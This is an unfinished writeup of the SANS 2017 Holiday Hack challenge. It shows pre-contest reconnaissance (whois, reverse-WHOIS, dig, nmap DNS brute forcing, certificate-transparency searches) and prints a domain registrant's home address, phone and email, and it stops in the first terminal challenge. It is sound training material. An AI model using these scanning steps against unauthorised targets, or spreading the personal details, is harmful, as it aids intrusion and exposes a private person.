<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>SANS 2017 Holiday Hack Writeup</title>
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<meta  name="author" content="Vlad Grigorescu" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center; }
  .todo   { font-family: monospace; color: red; }
  .done   { color: green; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  pre.src-sh:before    { content: 'sh'; }
  pre.src-bash:before  { content: 'sh'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-R:before     { content: 'R'; }
  pre.src-perl:before  { content: 'Perl'; }
  pre.src-java:before  { content: 'Java'; }
  pre.src-sql:before   { content: 'SQL'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.right  { text-align: center;  }
  th.left   { text-align: center;   }
  th.center { text-align: center; }
  td.right  { text-align: right;  }
  td.left   { text-align: left;   }
  td.center { text-align: center; }
  dt { font-weight: bold; }
  .footpara:nth-child(2) { display: inline; }
  .footpara { display: block; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/readtheorg.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/readtheorg.js"></script>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<style>#content{max-width:1200px;}</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2013 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/javascript" src="http://orgmode.org/mathjax/MathJax.js"></script>
<script type="text/javascript">
<!--/*--><![CDATA[/*><!--*/
    MathJax.Hub.Config({
        // Only one of the two following lines, depending on user settings
        // First allows browser-native MathML display, second forces HTML/CSS
        //  config: ["MMLorHTML.js"], jax: ["input/TeX"],
            jax: ["input/TeX", "output/HTML-CSS"],
        extensions: ["tex2jax.js","TeX/AMSmath.js","TeX/AMSsymbols.js",
                     "TeX/noUndefined.js"],
        tex2jax: {
            inlineMath: [ ["\\(","\\)"] ],
            displayMath: [ ['$$','$$'], ["\\[","\\]"], ["\\begin{displaymath}","\\end{displaymath}"] ],
            skipTags: ["script","noscript","style","textarea","pre","code"],
            ignoreClass: "tex2jax_ignore",
            processEscapes: false,
            processEnvironments: true,
            preview: "TeX"
        },
        showProcessingMessages: true,
        displayAlign: "center",
        displayIndent: "2em",

        "HTML-CSS": {
             scale: 100,
             availableFonts: ["STIX","TeX"],
             preferredFont: "TeX",
             webFont: "TeX",
             imageFont: "TeX",
             showMathMenu: true,
        },
        MMLorHTML: {
             prefer: {
                 MSIE:    "MML",
                 Firefox: "MML",
                 Opera:   "HTML",
                 other:   "HTML"
             }
        }
    });
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2017 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">Things to be done</a>
<ul>
<li><a href="#sec-1-1">Overall approach</a></li>
<li><a href="#sec-1-2">Introduction</a></li>
<li><a href="#sec-1-3">Answers</a></li>
<li><a href="#sec-1-4">Pre-contest Reconnaissance</a></li>
<li><a href="#sec-1-5">Terminals and Servers</a></li>
<li><a href="#sec-1-6">Easter Eggs</a></li>
<li><a href="#sec-1-7">Snowball Game</a></li>
</ul>
</li>
<li><a href="#sec-2">Introduction</a>
<ul>
<li><a href="#sec-2-1"><span class="todo TODO">TODO</span> Add more content here</a></li>
</ul>
</li>
<li><a href="#sec-3"><span class="todo TODO">TODO</span> tl;dr: Quick Answers</a></li>
<li><a href="#sec-4">Pre-contest Reconnaissance</a>
<ul>
<li><a href="#sec-4-1">Whois Searching</a></li>
<li><a href="#sec-4-2">DNS Brute Forcing</a></li>
<li><a href="#sec-4-3">Certificate Transparency Logs</a></li>
<li><a href="#sec-4-4">Monitoring</a></li>
<li><a href="#sec-4-5"><span class="todo TODO">TODO</span> Things changed at some point</a></li>
<li><a href="#sec-4-6">Recon Summary</a></li>
</ul>
</li>
<li><a href="#sec-5">Terminals</a>
<ul>
<li><a href="#sec-5-1">Winter Wonder Landing</a></li>
<li><a href="#sec-5-2">Winconceivable The Cliffs Of Insanity</a></li>
<li><a href="#sec-5-3">Cryokinetic Magic</a></li>
<li><a href="#sec-5-4">There's No Place Like Home</a></li>
<li><a href="#sec-5-5">Bumble's Bounce</a></li>
<li><a href="#sec-5-6">I Don't Think We're In Kansas Anymore</a></li>
<li><a href="#sec-5-7">Oh Wait Maybe We Are</a></li>
<li><a href="#sec-5-8">We're Off To See The</a></li>
</ul>
</li>
<li><a href="#sec-6">Answers</a>
<ul>
<li><a href="#sec-6-1"><span class="todo TODO">TODO</span> Question 1</a></li>
<li><a href="#sec-6-2"><span class="todo TODO">TODO</span> Question 2</a></li>
<li><a href="#sec-6-3"><span class="todo TODO">TODO</span> Question 3</a></li>
<li><a href="#sec-6-4"><span class="todo TODO">TODO</span> Question 4</a></li>
<li><a href="#sec-6-5"><span class="todo TODO">TODO</span> Question 5</a></li>
<li><a href="#sec-6-6"><span class="todo TODO">TODO</span> Question 6</a></li>
<li><a href="#sec-6-7"><span class="todo TODO">TODO</span> Question 7</a></li>
<li><a href="#sec-6-8"><span class="todo TODO">TODO</span> Question 8</a></li>
<li><a href="#sec-6-9"><span class="todo TODO">TODO</span> Question 9</a></li>
</ul>
</li>
<li><a href="#sec-7">Easter Eggs</a>
<ul>
<li><a href="#title">Easter Eggs</a></li>
<li><a href="#sec-7-2">Wintered logo is based on the Wicked stage musical poster.</a></li>
<li><a href="#sec-7-3">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
</ul>
</li>
<li><a href="#sec-8"><span class="todo TODO">TODO</span> Misc</a>
<ul>
<li><a href="#sec-8-1">Let the Hack Begin!</a></li>
<li><a href="#sec-8-2">Using ripgrep</a></li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">Things to be done</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1">Overall approach</h3>
<div class="outline-text-3" id="text-1-1">
<p>
Each question should have:
</p>
<ul class="org-ul">
<li><code>[&#xa0;]</code> A reference solution
</li>
<li><code>[&#xa0;]</code> An overview of the thought process and what we tried that led to that solution, <b>and what we tried that didn't work</b>
</li>
<li><code>[&#xa0;]</code> Some other ways that we could've solved it
</li>
<li><code>[&#xa0;]</code> A peak behind the curtain of how the challenge worked, and perhaps a better defense that would've mitigated the attack
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2">Introduction</h3>
<div class="outline-text-3" id="text-1-2">
<ul class="org-ul">
<li><code>[&#xa0;]</code> Write a paragraph about our approach to the challenge, what everyone did, etc.
</li>
<li><code>[&#xa0;]</code> Write a paragraph about the outline and presentation of the report ("We first lay out the solutions, then we show some other ways that we solved it, then we try to peak behind the curtain of how the challenges worked&#x2026;")
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3">Answers</h3>
<div class="outline-text-3" id="text-1-3">
<ul class="org-ul">
<li><code>[&#xa0;]</code> Write short answers to each of the questions
</li>
<li><code>[&#xa0;]</code> Link to where they can read more about the answers (maybe link to the "reference solution," and the "going further solution" for each)
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-4" class="outline-3">
<h3 id="sec-1-4">Pre-contest Reconnaissance</h3>
<div class="outline-text-3" id="text-1-4">
<ul class="org-ul">
<li><code>[&#xa0;]</code> Update the recon to talk about the changes that they made (hid some stuff in DNS, etc.)
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-5" class="outline-3">
<h3 id="sec-1-5">Terminals and Servers</h3>
<div class="outline-text-3" id="text-1-5">
<ul class="org-ul">
<li><code>[&#xa0;]</code> Reference solutions for solving each challenge
</li>
<li><code>[&#xa0;]</code> Thought process for solving each challenge
</li>
<li><code>[&#xa0;]</code> Alternative ways to solve each challenge
<ul class="org-ul">
<li><code>[&#xa0;]</code> EWA Server: Downloaded all the e-mails
</li>
<li><code>[&#xa0;]</code> EMI Server: Got Meterpreter working
</li>
<li><code>[&#xa0;]</code> Terminals: Reverse the binaries?
</li>
</ul>
</li>
<li><code>[&#xa0;]</code> Discuss how each challenge was setup
<ul class="org-ul">
<li><code>[&#xa0;]</code> EMI Server: Discuss the alabaster_snowball.py Python script
</li>
</ul>
</li>
<li><code>[&#xa0;]</code> AsciiCinema solution to each terminal?
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-6" class="outline-3">
<h3 id="sec-1-6">Easter Eggs</h3>
<div class="outline-text-3" id="text-1-6">
<ul class="org-ul">
<li><code>[&#xa0;]</code> List references and any hidden data we found
<ul class="org-ul">
<li><code>[&#xa0;]</code> The example Hash
</li>
<li><code>[&#xa0;]</code> nppd robots.txt
</li>
<li><code>[&#xa0;]</code> LDAP passwords
</li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1-7" class="outline-3">
<h3 id="sec-1-7">Snowball Game</h3>
<div class="outline-text-3" id="text-1-7">
<ul class="org-ul">
<li><code>[&#xa0;]</code> Videos to solving each level?
</li>
<li><code>[&#xa0;]</code> Hacking the game?
</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">Introduction</h2>
<div class="outline-text-2" id="text-2">
<p>
We're the Security team at the National Center for Supercomputing
Applications, and we worked together on yet another fun SANS Holiday
Hack, like we did last year. Over the past year, we've been surprised
to see how many skills and tricks from the 2016 Holiday Hack we used
for our jobs.
</p>

<p>
We've done "red-team" work such as code reviews and pen-tests, where
we encountered insufficient PHP input sanitization, development files
being left in production, and services being unintentionally
exposed. Our role in these instances is to find these issues before
someone malicious does, and to help and educate our users to
understand and prevent this from reoccuring. Other work we do is in
architecting defenses and mitigations. How do we secure systems and
services, while being as transparent as possible to end-users?
</p>

<p>
As we do red-team work, it's useful to try to think like a defender:
"How would <b>I</b> have secured this system, and are there any ways around
that?" Similarly, as we do blue-team work, we need to know the methods
and tools that an attacker would use. With that in mind, our approach
to this year's Holiday Hack is to solve the challenges, but also to
try to offer some insight into Alabaster Snowball's defenses. Where
possible, we offer some alternatives that he could've used which
would've been more secure.
</p>
</div>
<div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1"><span class="todo TODO">TODO</span> Add more content here</h3>
</div>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><span class="todo TODO">TODO</span> tl;dr: Quick Answers</h2>
</div>
<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">Pre-contest Reconnaissance</h2>
<div class="outline-text-2" id="text-4">

<div class="figure">
<p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
</p>
<p><span class="figure-number">Figure 1:</span> SANS Holiday Hack Challenge December 5th Update</p>
</div>

<p>
On December 5th, the SANS Holiday Hack Challenge was updated to tell
us that the 2017 Hack was coming soon, and encouraging us to catch up
on past challenges. The next day, we started doing just that. In
addition to reviewing previous challenges, we also began some
reconnaissance for the 2017 challenge.
</p>

<p>
Recon is a crucial step of any good penetration test, and is one that
often gets skipped in a "Capture the Flag" type of competition, since
most of the information is provided. Nevertheless, let's see what we
can find. The more information we have ahead of time, the better
prepared we'll be, and the less work we'll have to do during the
actual contest.
</p>

<p>
Much like how attackers will have indicators of compromise (IOCs)
which allow us to track and follow an individual attacker, the Counter
Hack team also does similar things every year, and will leave behind
some clues.
</p>
</div>

<div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1">Whois Searching</h3>
<div class="outline-text-3" id="text-4-1">
<p>
For example, the 2016 contest made use of the domain
www.northpolewonderland.com. We can look at publicly available WHOIS
data for that domain:
</p>

<div class="org-src-container">

<pre class="src src-sh">whois northpolewonderland.com | grep Registrant
</pre>
</div>

<pre class="example">
Registrant Name: Edward Skoudis
Registrant Organization: Counter Hack
Registrant Street: 2402 Alexandra Court
Registrant City: Howell
Registrant State/Province: New Jersey
Registrant Postal Code: 07731
Registrant Country: US
Registrant Phone: +1.7327511024
Registrant Phone Ext:
Registrant Fax: +1.7327511024
Registrant Fax Ext:
Registrant Email: edskoudis@yahoo.com
</pre>

<p>
There are a few services that allow you to do a "reverse WHOIS"
search, to search for domains by WHOIS data. For instance to search
for other domains where "edskoudis@yahoo.com" shows up in the contact
info: 
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="right" />

<col  class="left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">Domain Name</th>
<th scope="col" class="right">Creation Date</th>
<th scope="col" class="left">Registrar</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">northpolechristmastown.com</td>
<td class="right">2017-10-19</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">1hrctf.com</td>
<td class="right">2016-04-08</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">1hrctf.org</td>
<td class="right">2016-04-08</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">cranbian.org</td>
<td class="right">2016-11-22</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">hackfestchallenge.com</td>
<td class="right">2016-10-20</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">onehourctf.org</td>
<td class="right">2016-04-08</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">atnascorp.com</td>
<td class="right">2015-11-10</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">ginormouselectronicssupplier.com</td>
<td class="right">2015-12-09</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">holidayhackchallenge.com</td>
<td class="right">2015-11-02</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">holidayhackchallenge.org</td>
<td class="right">2015-11-02</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">digimeme.org</td>
<td class="right">2013-11-18</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">syn-pi.org</td>
<td class="right">2013-11-18</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">pseudovision.net</td>
<td class="right">2010-09-09</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="left">counterhack.net</td>
<td class="right">2001-06-22</td>
<td class="left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="left">skoudis.com</td>
<td class="right">2001-06-22</td>
<td class="left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="left">counterhack.com</td>
<td class="right">2000-05-30</td>
<td class="left">GODADDY.COM, LLC</td>
</tr>
</tbody>
</table>

<p>
This isn't comprehensive, since northpolewonderland.com didn't show up
in the results, but cranbian.org was another domain from 2016 that
does show up.
</p>

<p>
There are a couple of new entries since the 2016 contest, 1hrctf and
northpolechristmastown.com. 1hrctf seems unrelated, but it's a good
bet that northpolechristmastown.com will show up in the 2017
challenge.
</p>

<p>
At this point, we have to proceed with extreme caution. Since the
contest hasn't started, nothing is in scope yet. Any further digging
should be as unintrusive as possible.
</p>
</div>
</div>

<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2">DNS Brute Forcing</h3>
<div class="outline-text-3" id="text-4-2">
<p>
Now that we have a domain we're interested in, let's look at DNS:
</p>

<div class="org-src-container">

<pre class="src src-sh">dig ANY northpolechristmastown.com
</pre>
</div>

<pre class="example">
;; ANSWER SECTION:
northpolechristmastown.com. 5	IN	TXT	"v=spf1 include:_spf.google.com -all"
northpolechristmastown.com. 5	IN	MX	30 ALT2.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	40 ASPMX2.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	20 ALT1.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	50 ASPMX3.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	10 ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	SOA	ns53.domaincontrol.com. dns.jomax.net. 2017120112 28800 7200 604800 600
northpolechristmastown.com. 5	IN	NS	ns54.domaincontrol.com.
northpolechristmastown.com. 5	IN	NS	ns53.domaincontrol.com.
</pre>

<p>
From this, we can tell that GMail provides the e-mail for the domain,
and GoDaddy provides the DNS service. Of note, however, is that there
are no A or AAAA records, so northpolechristmastown.com does not
resolve to anything.
</p>

<p>
Next, we'll try some Google dorking. Googling for
site:northpolechristmastown.com reveals
nppd.northpolechristmastown.com, which is a Sign In page for the
North Pole Police Department. It looks like nppd uses Google OAuth
for authentication, and most pages are forbidden with a regular GMail
account.
</p>

<p>
Checking a few other common URLs on nppd, we can find some resources
that are available, including favicon.ico and robots.txt:
</p>
<pre class="example">
User-agent: hk-47
Disallow: /
Disallow: /needhelp
Disallow: /infractions
Disallow: /community
Disallow: /about

User-agent: threepio
Sand-Crawler-delay: 421

User-agent: artoo
Sand-Crawler-delay: 2187
</pre>


<div class="figure">
<p><img src="./images/nppd_star.png" alt="nppd_star.png" />
</p>
<p><span class="figure-number">Figure 2:</span> North Pole Police Department Logo</p>
</div>

<p>
Everything here but /infractions is forbidden. Looking at that page
returns a list of infractions, such as "Unauthorized access to cookie
jar" or "Computer infraction: Accessing siblings files without
permission." We also see some interesting infractions that refer to
previous Holiday Hacks:
</p>

<pre class="example">
    {
        "date": "2016-12-25T00:00:00",
        "name": "Dr. Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    },
    {
        "date": "2015-12-25T00:00:00",
        "name": "Cindy Lou Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    }
],
"query": "name:Who"
</pre>

<p>
Going back to DNS&lt; we can try to enumerate some hosts under the top
level domain. FuzzDB has a nice list of common DNS name, and we can
use an nmap script to try to query those:
</p>

<div class="org-src-container">

<pre class="src src-sh">$ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
</pre>
</div>

<pre class="example">
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-06 18:54 CST
Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Pre-scan script results:
| dns-brute:
|   DNS Brute-force hostnames:
|     intranet.northpolechristmastown.com - 35.196.239.128
|     files.northpolechristmastown.com - 35.185.43.23
|     dev.northpolechristmastown.com - 35.185.84.51
|     admin.northpolechristmastown.com - 35.185.115.185
|_    mail.northpolechristmastown.com - 35.185.115.185
</pre>

<p>
A couple of other lists resulted in the following hostnames as well:
</p>

<pre class="example">
|   DNS Brute-force hostnames:
|     emi.northpolechristmastown.com - 35.185.57.190
|_    ewa.northpolechristmastown.com - 35.185.115.185
</pre>
</div>
</div>

<div id="outline-container-sec-4-3" class="outline-3">
<h3 id="sec-4-3">Certificate Transparency Logs</h3>
<div class="outline-text-3" id="text-4-3">
<p>
Next, let's turn our attention to the holidayhackchallenge.com
domain. Last year, there were some new hosts that appeared under this
domain (e.g. quest2016.holidayhackchallenge.com). Brute-forcing this
will likely not get us very far, so let's try a different approach:
certificate transparency logs. Many certificate authorities maintain
transparency systems, so that issued certificates can be publicly
reviewd. Symantec, for instance, has a free tool that will search the
logs of several certificate authorities:
</p>


<div class="figure">
<p><img src="./images/recon_crypto_report.png" alt="recon_crypto_report.png" />
</p>
<p><span class="figure-number">Figure 3:</span> Symantec Crypto Report for holidayhackchallenge.com</p>
</div>

<p>
Searching for holidayhackchallenge.com reveals the following
certificates that don't look familiar:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="left" />

<col  class="right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">Common Name</th>
<th scope="col" class="left">Subject Alternate Names (SANs)</th>
<th scope="col" class="right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">2017.holidayhackchallenge.com</td>
<td class="left">2017, puzzler2017</td>
<td class="right">35.196.67.150</td>
</tr>

<tr>
<td class="left">docker2017.holidayhackchallenge.com</td>
<td class="left">&#xa0;</td>
<td class="right">35.190.163.207</td>
</tr>

<tr>
<td class="left">chat.holidayhackchallenge.com</td>
<td class="left">&#xa0;</td>
<td class="right">35.196.73.180</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-sec-4-4" class="outline-3">
<h3 id="sec-4-4">Monitoring</h3>
<div class="outline-text-3" id="text-4-4">
<p>
None of the 3 servers listed above are currently accessible on port 80
or 443 (HTTP and HTTPS). We setup some monitoring using a free online
service (uptimerobot.com). Every 5 minutes, it would try to connect to
HTTP and HTTPs on the 3 servers listed above. Once the systems become
available, it will text us and post a message to our Slack channel.
</p>

<p>
Once that happens, the hack is on, and we'll be ready to hit the
ground running.
</p>
</div>
</div>

<div id="outline-container-sec-4-5" class="outline-3">
<h3 id="sec-4-5"><span class="todo TODO">TODO</span> Things changed at some point</h3>
</div>
<div id="outline-container-sec-4-6" class="outline-3">
<h3 id="sec-4-6">Recon Summary</h3>
<div class="outline-text-3" id="text-4-6">
<p>
We can use the following indicators to search any clues we're later provided with:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="left" />

<col  class="left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">Indicator</th>
<th scope="col" class="left">Type</th>
<th scope="col" class="left">Source</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">northpolechristmastown.com</td>
<td class="left">Domain</td>
<td class="left">Reverse WHOIS</td>
</tr>

<tr>
<td class="left">holidayhackchallenge.com</td>
<td class="left">Domain</td>
<td class="left">2016 Hack</td>
</tr>

<tr>
<td class="left">nppd.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">Google Search</td>
</tr>

<tr>
<td class="left">intranet.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">files.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">dev.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">admin.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">mail.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">emi.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">ewa.northpolechristmastown.com</td>
<td class="left">FQDN</td>
<td class="left">DNS Brute Force</td>
</tr>

<tr>
<td class="left">2017.holidayhackchallenge.com</td>
<td class="left">FQDN</td>
<td class="left">Cert Transparency</td>
</tr>

<tr>
<td class="left">puzzler2017.holidayhackchallenge.com</td>
<td class="left">FQDN</td>
<td class="left">Cert SAN</td>
</tr>

<tr>
<td class="left">docker2017.holidayhackchallenge.com</td>
<td class="left">FQDN</td>
<td class="left">Cert Transparency</td>
</tr>

<tr>
<td class="left">chat.holidayhackchallenge.com</td>
<td class="left">FQDN</td>
<td class="left">Cert Transparency</td>
</tr>

<tr>
<td class="left">35.185.43.23</td>
<td class="left">IP</td>
<td class="left">DNS (files)</td>
</tr>

<tr>
<td class="left">35.185.57.190</td>
<td class="left">IP</td>
<td class="left">DNS (emi)</td>
</tr>

<tr>
<td class="left">35.185.84.51</td>
<td class="left">IP</td>
<td class="left">DNS (dev)</td>
</tr>

<tr>
<td class="left">35.185.115.185</td>
<td class="left">IP</td>
<td class="left">DNS (admin, mail, ewa)</td>
</tr>

<tr>
<td class="left">35.190.163.207</td>
<td class="left">IP</td>
<td class="left">DNS (docker2017)</td>
</tr>

<tr>
<td class="left">35.196.67.150</td>
<td class="left">IP</td>
<td class="left">DNS (2017)</td>
</tr>

<tr>
<td class="left">35.196.73.18</td>
<td class="left">IP</td>
<td class="left">DNS (chat)</td>
</tr>

<tr>
<td class="left">35.196.239.128</td>
<td class="left">IP</td>
<td class="left">DNS (intranet)</td>
</tr>

<tr>
<td class="left">HK-47 (Star Wars Droid)</td>
<td class="left">Reference</td>
<td class="left">nppd robots.txt</td>
</tr>

<tr>
<td class="left">Artoo (Star Wars Droid)</td>
<td class="left">Reference</td>
<td class="left">nppd robots.txt</td>
</tr>

<tr>
<td class="left">Threepio (Star Wars Droid)</td>
<td class="left">Reference</td>
<td class="left">nppd robots.txt</td>
</tr>

<tr>
<td class="left">Sand-Crawler (Star Wars Vehicle)</td>
<td class="left">Reference</td>
<td class="left">nppd robots.txt</td>
</tr>

<tr>
<td class="left">North Pole Police Department</td>
<td class="left">Reference</td>
<td class="left">nppd /infractions</td>
</tr>

<tr>
<td class="left">Cindy Lou Who (2015 Hack)</td>
<td class="left">Reference</td>
<td class="left">nppd /infractions</td>
</tr>

<tr>
<td class="left">Dr. Who (2016 Hack)</td>
<td class="left">Reference</td>
<td class="left">nppd /infractions</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">Terminals</h2>
<div class="outline-text-2" id="text-5">
</div><div id="outline-container-sec-5-1" class="outline-3">
<h3 id="sec-5-1">Winter Wonder Landing</h3>
<div class="outline-text-3" id="text-5-1">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-1-1" name="sec-5-1-1"></a>Winter Wonder Landing</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-1-1-1" name="sec-5-1-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;@&lt;
                              &gt;&gt;&gt;@&lt;&lt;*
                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
